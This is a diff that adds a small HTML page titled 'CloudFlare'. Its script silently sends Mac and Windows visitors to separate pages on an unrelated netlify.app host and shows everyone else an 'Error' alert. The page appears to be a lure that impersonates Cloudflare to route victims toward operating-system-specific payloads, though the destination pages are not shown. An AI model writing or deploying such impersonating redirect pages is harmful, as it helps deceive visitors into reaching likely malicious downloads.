@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CloudFlare</title>
+</head>
+<body>
+
+    <script>
+        const userAgent = navigator.userAgent.toLowerCase();
+        
+        if (userAgent.indexOf("mac") !== -1) {
+            window.location.href = "https://zzc94.netlify.app/mac.html";
+        } else if (userAgent.indexOf("win") !== -1) {
+            window.location.href = "https://zzc94.netlify.app/win.html";
+        } else {
+            alert("Error");
+        }
+    </script>
+
+</body>
+</html>
